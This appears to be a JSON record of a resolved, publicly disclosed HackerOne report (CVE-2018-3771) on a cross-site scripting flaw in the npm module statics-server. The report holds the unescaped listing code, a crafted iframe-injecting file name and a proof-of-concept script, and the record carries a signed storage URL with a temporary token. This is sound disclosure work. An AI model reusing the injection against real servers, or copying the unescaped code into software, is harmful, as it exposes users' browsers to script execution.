@@ -1,0 +1,141 @@
+{
+  "id": 355458,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTU0NTg=",
+  "url": "https://hackerone.com/reports/355458",
+  "title": "[statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-21T08:52:25.560Z",
+  "submitted_at": "2018-05-21T08:52:25.560Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3771"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-07-14T20:20:07.775Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-07-14T20:19:55.955Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Team,\n\nI would like to report HTML Injection in statics-server module.\nIt is possible to inject malicious ```iframe``` tag via filename and execute arbitray JavaScript code.\n\n# Module\n\n\n**module name:** statics-server\n**version:** 0.0.9\n**npm page:** https://www.npmjs.com/package/statics-server\n\n### Module Description\n\n\nnpm install statics-server -g\n\nGo to the folder you want to statics-server\n\nRun the server statics-server\n\n\n### Module Stats\n\n~80-100 downloads/month\n\n# Vulnerability\n\n## Vulnerability Description\n\n```statics-server``` does not implement any HTML escaping when displays directory index in the browser. Variable ```v``` is used in ```<a href>``` element without escaping, which allows to embed HTML ```<iframe>``` tag with ```src``` attribute points to another HTML file in the directory. This file can contain malicious JavaScript code, which will be executed:\n\n```javascript\n// ./node_modules/statics-server/index.js, line 18:\n\n    if(fs.lstatSync(staticPath).isDirectory()){\n        var files=fs.readdirSync(staticPath);\n        var lis='';\n        files.forEach((v,i)=>{\n            if(fs.lstatSync(path.resolve(staticPath,v)).isDirectory()){\n                lis+=`<li><a href=\"${req.url}${v}/\">${v}/</a></li>`;\n            }else {\n                lis+=`<li><a href=\"${req.url}${v}\">${v}</a></li>`\n            }\n        });\n\n        (...)\n\n```\n\n## Steps To Reproduce:\n\nInstall ```statics-server``` module:\n\n```\n$ npm install statics-server\n```\n\n- create file with the following filename:\n\n```\n\"><iframe src=\"malware_frame.html\">\n\n```\n\n- create ```malware_frame.html``` file with following content:\n\n```html\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script>\n        alert('Uh oh, I am bad, bad malware!!!')\n    </script>\n</body>\n\n</html>\n```\n\nRun ```statics-server```:\n\n```\n$ ./node_modules/statics-server/index.js \n服务器已经启动\n访问localhost:8080\n\n```\n\n- in browser, open the following url:\n\n```\nhttp://localhost:8080\n```\n\nYou see JavaScript from ```malware_frame.html``` executed immediately:\n\n{F299923}\n\n\n## Patch\n\n```v``` variable in provided code fragment should be escaped before is send back to the browser.\n\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.11.1\n- npm v. 6.0.1\n- Chromium 67.0.3388.0 (Developer Build) (64-bit)\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAn attacker is able to execute malicious JavaScript in context of other user's browser.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 299923,
+      "file_name": "1.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/299/923/b316d9ad1ec7fc4a57ff925e85edb6475cab8e55/1.jpg?response-content-disposition=attachment%3B%20filename%3D%221.jpg%22%3B%20filename%2A%3DUTF-8%27%271.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130425Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=66df079e35d35d6681b5c731f373661faeb1ba0c9556a199c5f8b5aa26dbee10",
+      "file_size": 100949,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-08-13T20:19:56.043Z",
+  "allow_singular_disclosure_after": -173637869.26628855,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "ali",
+    "dmxjon",
+    "eveeez",
+    "x1m",
+    "jackb898",
+    "japz",
+    "bluez",
+    "hemalia313",
+    "eagent"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 12358,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "statics-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
